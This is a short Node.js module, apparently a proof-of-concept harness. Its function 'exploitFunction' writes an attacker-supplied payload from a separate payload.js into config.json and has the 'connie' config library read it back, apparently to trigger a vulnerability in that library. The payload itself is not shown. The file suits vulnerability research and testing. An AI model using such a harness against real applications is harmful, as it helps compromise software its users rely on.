function exploitFunction() {
    const connie = require("connie");
    const fs = require("fs");
    const path = require("path");
    const pathToConfig = path.resolve(__dirname, "./config.json");

    fs.writeFileSync(pathToConfig, JSON.stringify(require("./payload.js").getPayload()));
    const config = connie("file", pathToConfig)
        .read()
        .then((data) => {
            return data;
        });

    return config;
}

module.exports = { exploitFunction };